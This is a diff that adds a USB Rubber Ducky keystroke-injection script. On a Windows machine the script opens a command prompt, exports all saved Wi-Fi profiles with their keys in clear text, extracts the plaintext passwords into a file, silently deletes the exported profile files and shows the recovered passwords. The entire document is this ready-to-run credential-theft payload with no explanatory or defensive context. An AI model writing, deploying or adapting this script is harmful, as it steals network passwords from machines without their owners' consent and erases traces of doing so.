@@ -1,0 +1,21 @@
+DELAY 1000
+DEFAULTDELAY 500
+GUI R
+STRING cmd
+ENTER
+STRING cd %temp%
+ENTER
+STRING netsh wlan export profile key=clear
+ENTER
+STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
+ENTER
+STRING copy Wi-Fi-PASS PSS.txt
+ENTER
+STRING del Wi-* /s /f /q
+ENTER
+STRING PSS.txt
+GUI UP
+DELAY 5000
+ALT F4
+STRING exit
+ENTER
